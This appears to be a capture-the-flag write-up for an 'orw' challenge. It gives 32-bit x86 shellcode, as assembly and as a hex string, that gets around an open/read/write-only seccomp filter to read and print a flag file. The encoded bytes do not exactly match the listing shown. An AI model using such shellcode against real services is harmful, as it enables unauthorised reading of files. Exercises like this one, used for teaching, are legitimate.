reversing
=========

takes 200 bytes of shellcode and executes int
beforehand it calls orw_seccomp function which ensures only open, read, and write syscalls can be used (no execve)


exploitation
============

super simple. here is the shellcode i wrote:

```asm
push 0
push 0x67616c66 "ag"
push 0x2f2f2f77 "w/fl"
push 0x726f2f65 "e/or"
push 0x6d6f682f "/hom"

mov eax, 5
mov ebx, esp
xor ecx, ecx // O_RDONLY
xor edx, edx // file already exists
int 0x80

mov ebx, eax
mov eax, 3
mov ecx, 0x0804a060 // where our shellcode is stored
sub ecx, 50         // prob enough space
mov edx, 50         
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, 0x0804a060
sub ecx, 50
mov edx, 50
int 0x80
```

and here is the encoded string: "\x68\x66\x6C\x61\x67\x68\x77\x2F\x2F\x2F\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\x31\xC9\x31\xD2\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x32\xBA\x32\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xB9\x60\xA0\x04\x08\x83\xE9\x32\xBA\x32\x00\x00\x00\xCD\x80"
